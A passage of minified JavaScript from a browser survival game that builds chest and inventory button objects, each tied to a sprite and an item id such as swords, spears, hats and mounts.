                    this.chest_buttons[Be.CARROT_SEED] = be(68, 68, 0, sprite[ze.CHEST_CARROT_SEED], 3),
                    this.chest_buttons[Be.CARROT_SEED].id = Be.CARROT_SEED,
                    this.chest_buttons[Be.CARROT] = be(68, 68, 0, sprite[ze.CHEST_CARROT], 3),
                    this.chest_buttons[Be.CARROT].id = Be.CARROT,
                    this.chest_buttons[Be.WATERMELON_SEED] = be(68, 68, 0, sprite[ze.CHEST_WATERMELON_SEED], 3),
                    this.chest_buttons[Be.WATERMELON_SEED].id = Be.WATERMELON_SEED,
                    this.chest_buttons[Be.WATERMELON] = be(68, 68, 0, sprite[ze.CHEST_WATERMELON], 3),
                    this.chest_buttons[Be.WATERMELON].id = Be.WATERMELON,
                    this.chest_buttons[Be.ALOE_VERA_SEED] = be(68, 68, 0, sprite[ze.CHEST_ALOE_VERA_SEED], 3),
                    this.chest_buttons[Be.ALOE_VERA_SEED].id = Be.ALOE_VERA_SEED,
                    this.chest_buttons[Be.ALOE_VERA] = be(68, 68, 0, sprite[ze.CHEST_ALOE_VERA], 3),
                    this.chest_buttons[Be.ALOE_VERA].id = Be.ALOE_VERA,
                    this.chest_buttons[Be.CHRISTMAS_HAT] = be(68, 68, 0, sprite[ze.CHEST_CHRISTMAS_HAT], 3),
                    this.chest_buttons[Be.CHRISTMAS_HAT].id = Be.CHRISTMAS_HAT,
                    this.chest_buttons[Be.ELF_HAT] = be(68, 68, 0, sprite[ze.CHEST_ELF_HAT], 3),
                    this.chest_buttons[Be.ELF_HAT].id = Be.ELF_HAT,
                    this.chest_buttons[Be.WOOD_SPEAR] = be(68, 68, 0, sprite[ze.CHEST_WOOD_SPEAR], 3),
                    this.chest_buttons[Be.WOOD_SPEAR].id = Be.WOOD_SPEAR,
                    this.chest_buttons[Be.DRAGON_SPEAR] = be(68, 68, 0, sprite[ze.CHEST_DRAGON_SPEAR], 3),
                    this.chest_buttons[Be.DRAGON_SPEAR].id = Be.DRAGON_SPEAR,
                    this.chest_buttons[Be.CRAB_STICK] = be(68, 68, 0, sprite[ze.CHEST_CRAB_STICK], 3),
                    this.chest_buttons[Be.CRAB_STICK].id = Be.CRAB_STICK,
                    this.chest_buttons[Be.CRAB_SPEAR] = be(68, 68, 0, sprite[ze.CHEST_CRAB_SPEAR], 3),
                    this.chest_buttons[Be.CRAB_SPEAR].id = Be.CRAB_SPEAR,
                    this.chest_buttons[Be.CRAB_LOOT] = be(68, 68, 0, sprite[ze.CHEST_CRAB_LOOT], 3),
                    this.chest_buttons[Be.CRAB_LOOT].id = Be.CRAB_LOOT,
                    this.chest_buttons[Be.BED] = be(68, 68, 0, sprite[ze.CHEST_BED], 3),
                    this.chest_buttons[Be.BED].id = Be.BED,
                    this.chest_buttons[Be.CROWN_CRAB] = be(68, 68, 0, sprite[ze.CHEST_CROWN_CRAB], 3),
                    this.chest_buttons[Be.CROWN_CRAB].id = Be.CROWN_CRAB,
                    this.chest_buttons[Be.GARLAND] = be(68, 68, 0, sprite[ze.CHEST_GARLAND], 3),
                    this.chest_buttons[Be.GARLAND].id = Be.GARLAND,
                    this.chest_buttons[Be.SUGAR_CAN] = be(68, 68, 0, sprite[ze.CHEST_SUGAR_CAN], 3),
                    this.chest_buttons[Be.SUGAR_CAN].id = Be.SUGAR_CAN,
                    this.chest_buttons[Be.CANDY] = be(68, 68, 0, sprite[ze.CHEST_CANDY], 3),
                    this.chest_buttons[Be.CANDY].id = Be.CANDY,
                    this.plus_buttons = [],
                    n = 0; n < 250; n++)
                    this.plus_buttons[n] = be(0, 0, 0, sprite[ze.CHEST_PLUS]);
                this.inv_buttons = [],
                    this.inv_buttons[Be.SWORD] = be(60, 60, 0, sprite[ze.INV_SWORD], 3),
                    this.inv_buttons[Be.SWORD].id = Be.SWORD,
                    this.inv_buttons[Be.PICK] = be(60, 60, 0, sprite[ze.INV_PICK], 3),
                    this.inv_buttons[Be.PICK].id = Be.PICK,
                    this.inv_buttons[Be.STONE] = be(60, 60, 0, sprite[ze.INV_STONE], 3),
                    this.inv_buttons[Be.STONE].id = Be.STONE,
                    this.inv_buttons[Be.STONE].info.img[2] = this.inv_buttons[Be.STONE].info.img[0],
                    this.inv_buttons[Be.WOOD] = be(60, 60, 0, sprite[ze.INV_WOOD], 3),
                    this.inv_buttons[Be.WOOD].id = Be.WOOD,
                    this.inv_buttons[Be.WOOD].info.img[2] = this.inv_buttons[Be.WOOD].info.img[0],
                    this.inv_buttons[Be.PLANT] = be(60, 60, 0, sprite[ze.INV_PLANT], 3),
                    this.inv_buttons[Be.PLANT].id = Be.PLANT,
                    this.inv_buttons[Be.CACTUS] = be(60, 60, 0, sprite[ze.INV_CACTUS], 3),
                    this.inv_buttons[Be.CACTUS].id = Be.CACTUS,
                    this.inv_buttons[Be.GOLD] = be(60, 60, 0, sprite[ze.INV_GOLD], 3),
                    this.inv_buttons[Be.GOLD].id = Be.GOLD,
                    this.inv_buttons[Be.GOLD].info.img[2] = this.inv_buttons[Be.GOLD].info.img[0],
                    this.inv_buttons[Be.DIAMOND] = be(60, 60, 0, sprite[ze.INV_DIAMOND], 3),
                    this.inv_buttons[Be.DIAMOND].id = Be.DIAMOND,
                    this.inv_buttons[Be.DIAMOND].info.img[2] = this.inv_buttons[Be.DIAMOND].info.img[0],
                    this.inv_buttons[Be.PICK_GOLD] = be(60, 60, 0, sprite[ze.INV_PICK_GOLD], 3),
                    this.inv_buttons[Be.PICK_GOLD].id = Be.PICK_GOLD,
                    this.inv_buttons[Be.PICK_DIAMOND] = be(60, 60, 0, sprite[ze.INV_PICK_DIAMOND], 3),
                    this.inv_buttons[Be.PICK_DIAMOND].id = Be.PICK_DIAMOND,
                    this.inv_buttons[Be.SWORD_GOLD] = be(60, 60, 0, sprite[ze.INV_SWORD_GOLD], 3),
                    this.inv_buttons[Be.SWORD_GOLD].id = Be.SWORD_GOLD,
                    this.inv_buttons[Be.SWORD_WOOD] = be(60, 60, 0, sprite[ze.INV_SWORD_WOOD], 3),
                    this.inv_buttons[Be.SWORD_WOOD].id = Be.SWORD_WOOD,
                    this.inv_buttons[Be.SWORD_DIAMOND] = be(60, 60, 0, sprite[ze.INV_SWORD_DIAMOND], 3),
                    this.inv_buttons[Be.SWORD_DIAMOND].id = Be.SWORD_DIAMOND,
                    this.inv_buttons[Be.FIRE] = be(60, 60, 0, sprite[ze.INV_FIRE], 3),
                    this.inv_buttons[Be.FIRE].id = Be.FIRE,
                    this.inv_buttons[Be.WORKBENCH] = be(60, 60, 0, sprite[ze.INV_WORK], 3),
                    this.inv_buttons[Be.WORKBENCH].id = Be.WORKBENCH,
                    this.inv_buttons[Be.SEED] = be(60, 60, 0, sprite[ze.INV_SEED], 3),
                    this.inv_buttons[Be.SEED].id = Be.SEED,
                    this.inv_buttons[Be.WALL] = be(60, 60, 0, sprite[ze.INV_WALL], 3),
                    this.inv_buttons[Be.WALL].id = Be.WALL,
                    this.inv_buttons[Be.SPIKE] = be(60, 60, 0, sprite[ze.INV_SPIKE], 3),
                    this.inv_buttons[Be.SPIKE].id = Be.SPIKE,
                    this.inv_buttons[Be.PICK_WOOD] = be(60, 60, 0, sprite[ze.INV_PICK_WOOD], 3),
                    this.inv_buttons[Be.PICK_WOOD].id = Be.PICK_WOOD,
                    this.inv_buttons[Be.COOKED_MEAT] = be(60, 60, 0, sprite[ze.INV_COOKED_MEAT], 3),
                    this.inv_buttons[Be.COOKED_MEAT].id = Be.COOKED_MEAT,
                    this.inv_buttons[Be.MEAT] = be(60, 60, 0, sprite[ze.INV_MEAT], 3),
                    this.inv_buttons[Be.MEAT].id = Be.MEAT,
                    this.inv_buttons[Be.BIG_FIRE] = be(60, 60, 0, sprite[ze.INV_BIG_FIRE], 3),
                    this.inv_buttons[Be.BIG_FIRE].id = Be.BIG_FIRE,
                    this.inv_buttons[Be.BANDAGE] = be(60, 60, 0, sprite[ze.INV_BANDAGE], 3),
                    this.inv_buttons[Be.BANDAGE].id = Be.BANDAGE,
                    this.inv_buttons[Be.CORD] = be(60, 60, 0, sprite[ze.INV_CORD], 3),
                    this.inv_buttons[Be.CORD].id = Be.CORD,
                    this.inv_buttons[Be.CORD].info.img[2] = this.inv_buttons[Be.CORD].info.img[0],
                    this.inv_buttons[Be.STONE_WALL] = be(60, 60, 0, sprite[ze.INV_STONE_WALL], 3),
                    this.inv_buttons[Be.STONE_WALL].id = Be.STONE_WALL,
                    this.inv_buttons[Be.GOLD_WALL] = be(60, 60, 0, sprite[ze.INV_GOLD_WALL], 3),
                    this.inv_buttons[Be.GOLD_WALL].id = Be.GOLD_WALL,
                    this.inv_buttons[Be.DIAMOND_WALL] = be(60, 60, 0, sprite[ze.INV_DIAMOND_WALL], 3),
                    this.inv_buttons[Be.DIAMOND_WALL].id = Be.DIAMOND_WALL,
                    this.inv_buttons[Be.WOOD_DOOR] = be(60, 60, 0, sprite[ze.INV_DOOR_WOOD_CLOSE], 3),
                    this.inv_buttons[Be.WOOD_DOOR].id = Be.WOOD_DOOR,
                    this.inv_buttons[Be.CHEST] = be(60, 60, 0, sprite[ze.INV_CHEST], 3),
                    this.inv_buttons[Be.CHEST].id = Be.CHEST,
                    this.inv_buttons[Be.STONE_SPIKE] = be(60, 60, 0, sprite[ze.INV_STONE_SPIKE], 3),
                    this.inv_buttons[Be.STONE_SPIKE].id = Be.STONE_SPIKE,
                    this.inv_buttons[Be.GOLD_SPIKE] = be(60, 60, 0, sprite[ze.INV_GOLD_SPIKE], 3),
                    this.inv_buttons[Be.GOLD_SPIKE].id = Be.GOLD_SPIKE,
                    this.inv_buttons[Be.DIAMOND_SPIKE] = be(60, 60, 0, sprite[ze.INV_DIAMOND_SPIKE], 3),
                    this.inv_buttons[Be.DIAMOND_SPIKE].id = Be.DIAMOND_SPIKE,
                    this.inv_buttons[Be.BAG] = be(60, 60, 0, sprite[ze.INV_BAG], 3),
                    this.inv_buttons[Be.BAG].id = Be.BAG,
                    this.inv_buttons[Be.EARMUFFS] = be(60, 60, 0, sprite[ze.INV_EARMUFFS], 3),
                    this.inv_buttons[Be.EARMUFFS].id = Be.EARMUFFS,
                    this.inv_buttons[Be.STONE_DOOR] = be(60, 60, 0, sprite[ze.INV_DOOR_STONE_CLOSE], 3),
                    this.inv_buttons[Be.STONE_DOOR].id = Be.STONE_DOOR,
                    this.inv_buttons[Be.GOLD_DOOR] = be(60, 60, 0, sprite[ze.INV_DOOR_GOLD_CLOSE], 3),
                    this.inv_buttons[Be.GOLD_DOOR].id = Be.GOLD_DOOR,
                    this.inv_buttons[Be.DIAMOND_DOOR] = be(60, 60, 0, sprite[ze.INV_DOOR_DIAMOND_CLOSE], 3),
                    this.inv_buttons[Be.DIAMOND_DOOR].id = Be.DIAMOND_DOOR,
                    this.inv_buttons[Be.FUR] = be(60, 60, 0, sprite[ze.INV_FUR], 3),
                    this.inv_buttons[Be.FUR].id = Be.FUR,
                    this.inv_buttons[Be.FUR].info.img[2] = this.inv_buttons[Be.FUR].info.img[0],
                    this.inv_buttons[Be.FUR_BOAR] = be(60, 60, 0, sprite[ze.INV_FUR_BOAR], 3),
                    this.inv_buttons[Be.FUR_BOAR].id = Be.FUR_BOAR,
                    this.inv_buttons[Be.FUR_BOAR].info.img[2] = this.inv_buttons[Be.FUR_BOAR].info.img[0],
                    this.inv_buttons[Be.FUR_WOLF] = be(60, 60, 0, sprite[ze.INV_FUR_WOLF], 3),
                    this.inv_buttons[Be.FUR_WOLF].id = Be.FUR_WOLF,
                    this.inv_buttons[Be.FUR_WOLF].info.img[2] = this.inv_buttons[Be.FUR_WOLF].info.img[0],
                    this.inv_buttons[Be.PENGUIN_FEATHER] = be(60, 60, 0, sprite[ze.INV_PENGUIN_FEATHER], 3),
                    this.inv_buttons[Be.PENGUIN_FEATHER].id = Be.PENGUIN_FEATHER,
                    this.inv_buttons[Be.HAWK_FEATHER] = be(60, 60, 0, sprite[ze.INV_HAWK_FEATHER], 3),
                    this.inv_buttons[Be.HAWK_FEATHER].id = Be.HAWK_FEATHER,
                    this.inv_buttons[Be.VULTURE_FEATHER] = be(60, 60, 0, sprite[ze.INV_VULTURE_FEATHER], 3),
                    this.inv_buttons[Be.VULTURE_FEATHER].id = Be.VULTURE_FEATHER,
                    this.inv_buttons[Be.EMERALD] = be(60, 60, 0, sprite[ze.INV_EMERALD], 3),
                    this.inv_buttons[Be.EMERALD].id = Be.EMERALD,
                    this.inv_buttons[Be.EARMUFFS] = be(60, 60, 0, sprite[ze.INV_EARMUFFS], 3),
                    this.inv_buttons[Be.EARMUFFS].id = Be.EARMUFFS,
                    this.inv_buttons[Be.COAT] = be(60, 60, 0, sprite[ze.INV_COAT], 3),
                    this.inv_buttons[Be.COAT].id = Be.COAT,
                    this.inv_buttons[Be.WOOD_SPEAR] = be(60, 60, 0, sprite[ze.INV_WOOD_SPEAR], 3),
                    this.inv_buttons[Be.WOOD_SPEAR].id = Be.WOOD_SPEAR,
                    this.inv_buttons[Be.SPEAR] = be(60, 60, 0, sprite[ze.INV_SPEAR], 3),
                    this.inv_buttons[Be.SPEAR].id = Be.SPEAR,
                    this.inv_buttons[Be.GOLD_SPEAR] = be(60, 60, 0, sprite[ze.INV_GOLD_SPEAR], 3),
                    this.inv_buttons[Be.GOLD_SPEAR].id = Be.GOLD_SPEAR,
                    this.inv_buttons[Be.DIAMOND_SPEAR] = be(60, 60, 0, sprite[ze.INV_DIAMOND_SPEAR], 3),
                    this.inv_buttons[Be.DIAMOND_SPEAR].id = Be.DIAMOND_SPEAR,
                    this.inv_buttons[Be.DRAGON_SPEAR] = be(60, 60, 0, sprite[ze.INV_DRAGON_SPEAR], 3),
                    this.inv_buttons[Be.DRAGON_SPEAR].id = Be.DRAGON_SPEAR,
                    this.inv_buttons[Be.FURNACE] = be(60, 60, 0, sprite[ze.INV_FURNACE], 3),
                    this.inv_buttons[Be.FURNACE].id = Be.FURNACE,
                    this.inv_buttons[Be.EXPLORER_HAT] = be(60, 60, 0, sprite[ze.INV_EXPLORER_HAT], 3),
                    this.inv_buttons[Be.EXPLORER_HAT].id = Be.EXPLORER_HAT,
                    this.inv_buttons[Be.PIRATE_HAT] = be(60, 60, 0, sprite[ze.INV_PIRATE_HAT], 3),
                    this.inv_buttons[Be.PIRATE_HAT].id = Be.PIRATE_HAT,
                    this.inv_buttons[Be.FLOWER_HAT] = be(60, 60, 0, sprite[ze.INV_FLOWER_HAT], 3),
                    this.inv_buttons[Be.FLOWER_HAT].id = Be.FLOWER_HAT,
                    this.inv_buttons[Be.FUR_HAT] = be(60, 60, 0, sprite[ze.INV_FUR_HAT], 3),
                    this.inv_buttons[Be.FUR_HAT].id = Be.FUR_HAT,
                    this.inv_buttons[Be.TURBAN1] = be(60, 60, 0, sprite[ze.INV_TURBAN1], 3),
                    this.inv_buttons[Be.TURBAN1].id = Be.TURBAN1,
                    this.inv_buttons[Be.TURBAN2] = be(60, 60, 0, sprite[ze.INV_TURBAN2], 3),
                    this.inv_buttons[Be.TURBAN2].id = Be.TURBAN2,
                    this.inv_buttons[Be.WOOD_BOW] = be(60, 60, 0, sprite[ze.INV_WOOD_BOW], 3),
                    this.inv_buttons[Be.WOOD_BOW].id = Be.WOOD_BOW,
                    this.inv_buttons[Be.WOOD_ARROW] = be(60, 60, 0, sprite[ze.INV_WOOD_ARROW], 3),
                    this.inv_buttons[Be.WOOD_ARROW].id = Be.WOOD_ARROW,
                    this.inv_buttons[Be.WOOD_SHIELD] = be(60, 60, 0, sprite[ze.INV_WOOD_SHIELD], 3),
                    this.inv_buttons[Be.WOOD_SHIELD].id = Be.WOOD_SHIELD,
                    this.inv_buttons[Be.STONE_BOW] = be(60, 60, 0, sprite[ze.INV_STONE_BOW], 3),
                    this.inv_buttons[Be.STONE_BOW].id = Be.STONE_BOW,
                    this.inv_buttons[Be.STONE_ARROW] = be(60, 60, 0, sprite[ze.INV_STONE_ARROW], 3),
                    this.inv_buttons[Be.STONE_ARROW].id = Be.STONE_ARROW,
                    this.inv_buttons[Be.STONE_SHIELD] = be(60, 60, 0, sprite[ze.INV_STONE_SHIELD], 3),
                    this.inv_buttons[Be.STONE_SHIELD].id = Be.STONE_SHIELD,
                    this.inv_buttons[Be.GOLD_BOW] = be(60, 60, 0, sprite[ze.INV_GOLD_BOW], 3),
                    this.inv_buttons[Be.GOLD_BOW].id = Be.GOLD_BOW,
                    this.inv_buttons[Be.GOLD_ARROW] = be(60, 60, 0, sprite[ze.INV_GOLD_ARROW], 3),
                    this.inv_buttons[Be.GOLD_ARROW].id = Be.GOLD_ARROW,
                    this.inv_buttons[Be.GOLD_SHIELD] = be(60, 60, 0, sprite[ze.INV_GOLD_SHIELD], 3),
                    this.inv_buttons[Be.GOLD_SHIELD].id = Be.GOLD_SHIELD,
                    this.inv_buttons[Be.DIAMOND_BOW] = be(60, 60, 0, sprite[ze.INV_DIAMOND_BOW], 3),
                    this.inv_buttons[Be.DIAMOND_BOW].id = Be.DIAMOND_BOW,
                    this.inv_buttons[Be.DIAMOND_ARROW] = be(60, 60, 0, sprite[ze.INV_DIAMOND_ARROW], 3),
                    this.inv_buttons[Be.DIAMOND_ARROW].id = Be.DIAMOND_ARROW,
                    this.inv_buttons[Be.DIAMOND_SHIELD] = be(60, 60, 0, sprite[ze.INV_DIAMOND_SHIELD], 3),
                    this.inv_buttons[Be.DIAMOND_SHIELD].id = Be.DIAMOND_SHIELD,
                    this.inv_buttons[Be.AMETHYST_BOW] = be(60, 60, 0, sprite[ze.INV_AMETHYST_BOW], 3),
                    this.inv_buttons[Be.AMETHYST_BOW].id = Be.AMETHYST_BOW,
                    this.inv_buttons[Be.AMETHYST_ARROW] = be(60, 60, 0, sprite[ze.INV_AMETHYST_ARROW], 3),
                    this.inv_buttons[Be.AMETHYST_ARROW].id = Be.AMETHYST_ARROW,
                    this.inv_buttons[Be.AMETHYST_SHIELD] = be(60, 60, 0, sprite[ze.INV_AMETHYST_SHIELD], 3),
                    this.inv_buttons[Be.AMETHYST_SHIELD].id = Be.AMETHYST_SHIELD,
                    this.inv_buttons[Be.REIDITE_BOW] = be(60, 60, 0, sprite[ze.INV_REIDITE_BOW], 3),
                    this.inv_buttons[Be.REIDITE_BOW].id = Be.REIDITE_BOW,
                    this.inv_buttons[Be.REIDITE_ARROW] = be(60, 60, 0, sprite[ze.INV_REIDITE_ARROW], 3),
                    this.inv_buttons[Be.REIDITE_ARROW].id = Be.REIDITE_ARROW,
                    this.inv_buttons[Be.REIDITE_SHIELD] = be(60, 60, 0, sprite[ze.INV_REIDITE_SHIELD], 3),
                    this.inv_buttons[Be.REIDITE_SHIELD].id = Be.REIDITE_SHIELD,
                    this.inv_buttons[Be.DRAGON_BOW] = be(60, 60, 0, sprite[ze.INV_DRAGON_BOW], 3),
                    this.inv_buttons[Be.DRAGON_BOW].id = Be.DRAGON_BOW,
                    this.inv_buttons[Be.DRAGON_ARROW] = be(60, 60, 0, sprite[ze.INV_DRAGON_ARROW], 3),
                    this.inv_buttons[Be.DRAGON_ARROW].id = Be.DRAGON_ARROW,
                    this.inv_buttons[Be.WOOD_HELMET] = be(60, 60, 0, sprite[ze.INV_WOOD_HELMET], 3),
                    this.inv_buttons[Be.WOOD_HELMET].id = Be.WOOD_HELMET,
                    this.inv_buttons[Be.STONE_HELMET] = be(60, 60, 0, sprite[ze.INV_STONE_HELMET], 3),
                    this.inv_buttons[Be.STONE_HELMET].id = Be.STONE_HELMET,
                    this.inv_buttons[Be.GOLD_HELMET] = be(60, 60, 0, sprite[ze.INV_GOLD_HELMET], 3),
                    this.inv_buttons[Be.GOLD_HELMET].id = Be.GOLD_HELMET,
                    this.inv_buttons[Be.DIAMOND_HELMET] = be(60, 60, 0, sprite[ze.INV_DIAMOND_HELMET], 3),
                    this.inv_buttons[Be.DIAMOND_HELMET].id = Be.DIAMOND_HELMET,
                    this.inv_buttons[Be.BOOK] = be(60, 60, 0, sprite[ze.INV_BOOK], 3),
                    this.inv_buttons[Be.BOOK].id = Be.BOOK,
                    this.inv_buttons[Be.PAPER] = be(60, 60, 0, sprite[ze.INV_PAPER], 3),
                    this.inv_buttons[Be.PAPER].id = Be.PAPER,
                    this.inv_buttons[Be.PAPER].info.img[2] = this.inv_buttons[Be.PAPER].info.img[0],
                    this.inv_buttons[Be.BAG] = be(60, 60, 0, sprite[ze.INV_BAG], 3),
                    this.inv_buttons[Be.BAG].id = Be.BAG,
                    this.inv_buttons[Be.AMETHYST] = be(60, 60, 0, sprite[ze.INV_AMETHYST], 3),
                    this.inv_buttons[Be.AMETHYST].id = Be.AMETHYST,
                    this.inv_buttons[Be.AMETHYST].info.img[2] = this.inv_buttons[Be.AMETHYST].info.img[0],
                    this.inv_buttons[Be.SWORD_AMETHYST] = be(60, 60, 0, sprite[ze.INV_SWORD_AMETHYST], 3),
                    this.inv_buttons[Be.SWORD_AMETHYST].id = Be.SWORD_AMETHYST,
                    this.inv_buttons[Be.PIRATE_SWORD] = be(60, 60, 0, sprite[ze.INV_PIRATE_SWORD], 3),
                    this.inv_buttons[Be.PIRATE_SWORD].id = Be.PIRATE_SWORD,
                    this.inv_buttons[Be.PICK_AMETHYST] = be(60, 60, 0, sprite[ze.INV_PICK_AMETHYST], 3),
                    this.inv_buttons[Be.PICK_AMETHYST].id = Be.PICK_AMETHYST,
                    this.inv_buttons[Be.PICK_REIDITE] = be(60, 60, 0, sprite[ze.INV_PICK_REIDITE], 3),
                    this.inv_buttons[Be.PICK_REIDITE].id = Be.PICK_REIDITE,
                    this.inv_buttons[Be.AMETHYST_SPEAR] = be(60, 60, 0, sprite[ze.INV_AMETHYST_SPEAR], 3),
                    this.inv_buttons[Be.AMETHYST_SPEAR].id = Be.AMETHYST_SPEAR,
                    this.inv_buttons[Be.HAMMER] = be(60, 60, 0, sprite[ze.INV_HAMMER], 3),
                    this.inv_buttons[Be.HAMMER].id = Be.HAMMER,
                    this.inv_buttons[Be.HAMMER_GOLD] = be(60, 60, 0, sprite[ze.INV_HAMMER_GOLD], 3),
                    this.inv_buttons[Be.HAMMER_GOLD].id = Be.HAMMER_GOLD,
                    this.inv_buttons[Be.HAMMER_DIAMOND] = be(60, 60, 0, sprite[ze.INV_HAMMER_DIAMOND], 3),
                    this.inv_buttons[Be.HAMMER_DIAMOND].id = Be.HAMMER_DIAMOND,
                    this.inv_buttons[Be.HAMMER_AMETHYST] = be(60, 60, 0, sprite[ze.INV_HAMMER_AMETHYST], 3),
                    this.inv_buttons[Be.HAMMER_AMETHYST].id = Be.HAMMER_AMETHYST,
                    this.inv_buttons[Be.HAMMER_REIDITE] = be(60, 60, 0, sprite[ze.INV_HAMMER_REIDITE], 3),
                    this.inv_buttons[Be.HAMMER_REIDITE].id = Be.HAMMER_REIDITE,
                    this.inv_buttons[Be.AMETHYST_WALL] = be(60, 60, 0, sprite[ze.INV_AMETHYST_WALL], 3),
                    this.inv_buttons[Be.AMETHYST_WALL].id = Be.AMETHYST_WALL,
                    this.inv_buttons[Be.AMETHYST_SPIKE] = be(60, 60, 0, sprite[ze.INV_AMETHYST_SPIKE], 3),
                    this.inv_buttons[Be.AMETHYST_SPIKE].id = Be.AMETHYST_SPIKE,
                    this.inv_buttons[Be.AMETHYST_DOOR] = be(60, 60, 0, sprite[ze.INV_DOOR_AMETHYST_CLOSE], 3),
                    this.inv_buttons[Be.AMETHYST_DOOR].id = Be.AMETHYST_DOOR,
                    this.inv_buttons[Be.CAP_SCARF] = be(60, 60, 0, sprite[ze.INV_CAP_SCARF], 3),
                    this.inv_buttons[Be.CAP_SCARF].id = Be.CAP_SCARF,
                    this.inv_buttons[Be.FUR_WINTER] = be(60, 60, 0, sprite[ze.INV_FUR_WINTER], 3),
                    this.inv_buttons[Be.FUR_WINTER].id = Be.FUR_WINTER,
                    this.inv_buttons[Be.FUR_WINTER].info.img[2] = this.inv_buttons[Be.FUR_WINTER].info.img[0],
                    this.inv_buttons[Be.FUR_MAMMOTH] = be(60, 60, 0, sprite[ze.INV_FUR_MAMMOTH], 3),
                    this.inv_buttons[Be.FUR_MAMMOTH].id = Be.FUR_MAMMOTH,
                    this.inv_buttons[Be.FUR_MAMMOTH].info.img[2] = this.inv_buttons[Be.FUR_MAMMOTH].info.img[0],
                    this.inv_buttons[Be.BLUE_CORD] = be(60, 60, 0, sprite[ze.INV_BLUE_CORD], 3),
                    this.inv_buttons[Be.BLUE_CORD].id = Be.BLUE_CORD,
                    this.inv_buttons[Be.BLUE_CORD].info.img[2] = this.inv_buttons[Be.BLUE_CORD].info.img[0],
                    this.inv_buttons[Be.LOCK] = be(60, 60, 0, sprite[ze.INV_LOCK], 3),
                    this.inv_buttons[Be.LOCK].id = Be.LOCK,
                    this.inv_buttons[Be.LOCK].info.img[2] = this.inv_buttons[Be.LOCK].info.img[0],
                    this.inv_buttons[Be.DRAGON_HEART] = be(60, 60, 0, sprite[ze.INV_DRAGON_HEART], 3),
                    this.inv_buttons[Be.DRAGON_HEART].id = Be.DRAGON_HEART,
                    this.inv_buttons[Be.LAVA_HEART] = be(60, 60, 0, sprite[ze.INV_LAVA_HEART], 3),
                    this.inv_buttons[Be.LAVA_HEART].id = Be.LAVA_HEART,
                    this.inv_buttons[Be.RESURRECTION] = be(60, 60, 0, sprite[ze.INV_RESURRECTION], 3),
                    this.inv_buttons[Be.RESURRECTION].id = Be.RESURRECTION,
                    this.inv_buttons[Be.LOCKPICK] = be(60, 60, 0, sprite[ze.INV_LOCKPICK], 3),
                    this.inv_buttons[Be.LOCKPICK].id = Be.LOCKPICK,
                    this.inv_buttons[Be.TOTEM] = be(60, 60, 0, sprite[ze.INV_TOTEM], 3),
                    this.inv_buttons[Be.TOTEM].id = Be.TOTEM,
                    this.inv_buttons[Be.AMETHYST_HELMET] = be(60, 60, 0, sprite[ze.INV_AMETHYST_HELMET], 3),
                    this.inv_buttons[Be.AMETHYST_HELMET].id = Be.AMETHYST_HELMET,
                    this.inv_buttons[Be.SUPER_HAMMER] = be(60, 60, 0, sprite[ze.INV_SUPER_HAMMER], 3),
                    this.inv_buttons[Be.SUPER_HAMMER].id = Be.SUPER_HAMMER,
                    this.inv_buttons[Be.BRIDGE] = be(60, 60, 0, sprite[ze.INV_BRIDGE], 3),
                    this.inv_buttons[Be.BRIDGE].id = Be.BRIDGE,
                    this.inv_buttons[Be.WOOD_TOWER] = be(60, 60, 0, sprite[ze.INV_WOOD_TOWER], 3),
                    this.inv_buttons[Be.WOOD_TOWER].id = Be.WOOD_TOWER,
                    this.inv_buttons[Be.BOAT] = be(60, 60, 0, sprite[ze.INV_BOAT], 3),
                    this.inv_buttons[Be.BOAT].id = Be.BOAT,
                    this.inv_buttons[Be.SLED] = be(60, 60, 0, sprite[ze.INV_SLED], 3),
                    this.inv_buttons[Be.SLED].id = Be.SLED,
                    this.inv_buttons[Be.PLANE] = be(60, 60, 0, sprite[ze.INV_PLANE], 3),
                    this.inv_buttons[Be.PLANE].id = Be.PLANE,
                    this.inv_buttons[Be.SADDLE] = be(60, 60, 0, sprite[ze.INV_SADDLE], 3),
                    this.inv_buttons[Be.SADDLE].id = Be.SADDLE,
                    this.inv_buttons[Be.MOUNT_BOAR] = be(60, 60, 0, sprite[ze.INV_MOUNT_BOAR], 3),
                    this.inv_buttons[Be.MOUNT_BOAR].id = Be.MOUNT_BOAR,
                    this.inv_buttons[Be.CRAB_BOSS] = be(60, 60, 0, sprite[ze.INV_CRAB_BOSS], 3),
                    this.inv_buttons[Be.CRAB_BOSS].id = Be.CRAB_BOSS,
                    this.inv_buttons[Be.BABY_DRAGON] = be(60, 60, 0, sprite[ze.INV_BABY_DRAGON], 3),
                    this.inv_buttons[Be.BABY_DRAGON].id = Be.BABY_DRAGON,
                    this.inv_buttons[Be.BABY_MAMMOTH] = be(60, 60, 0, sprite[ze.INV_BABY_MAMMOTH], 3),
                    this.inv_buttons[Be.BABY_MAMMOTH].id = Be.BABY_MAMMOTH,
                    this.inv_buttons[Be.BABY_LAVA] = be(60, 60, 0, sprite[ze.INV_BABY_LAVA], 3),
                    this.inv_buttons[Be.BABY_LAVA].id = Be.BABY_LAVA,
                    this.inv_buttons[Be.HAWK] = be(60, 60, 0, sprite[ze.INV_HAWK], 3),
                    this.inv_buttons[Be.HAWK].id = Be.HAWK,
                    this.inv_buttons[Be.SAND] = be(60, 60, 0, sprite[ze.INV_SAND], 3),
                    this.inv_buttons[Be.SAND].id = Be.SAND,
                    this.inv_buttons[Be.SAND].info.img[2] = this.inv_buttons[Be.SAND].info.img[0],
                    this.inv_buttons[Be.BOTTLE_FULL] = be(60, 60, 0, sprite[ze.INV_BOTTLE_FULL], 3),
                    this.inv_buttons[Be.BOTTLE_FULL].id = Be.BOTTLE_FULL,
                    this.inv_buttons[Be.BOTTLE_EMPTY] = be(60, 60, 0, sprite[ze.INV_BOTTLE_EMPTY], 3),
                    this.inv_buttons[Be.BOTTLE_EMPTY].id = Be.BOTTLE_EMPTY,
                    this.inv_buttons[Be.SHOVEL] = be(60, 60, 0, sprite[ze.INV_SHOVEL], 3),
                    this.inv_buttons[Be.SHOVEL].id = Be.SHOVEL,
                    this.inv_buttons[Be.SHOVEL_GOLD] = be(60, 60, 0, sprite[ze.INV_SHOVEL_GOLD], 3),
                    this.inv_buttons[Be.SHOVEL_GOLD].id = Be.SHOVEL_GOLD,
                    this.inv_buttons[Be.SHOVEL_DIAMOND] = be(60, 60, 0, sprite[ze.INV_SHOVEL_DIAMOND], 3),
                    this.inv_buttons[Be.SHOVEL_DIAMOND].id = Be.SHOVEL_DIAMOND,
                    this.inv_buttons[Be.SHOVEL_AMETHYST] = be(60, 60, 0, sprite[ze.INV_SHOVEL_AMETHYST], 3),
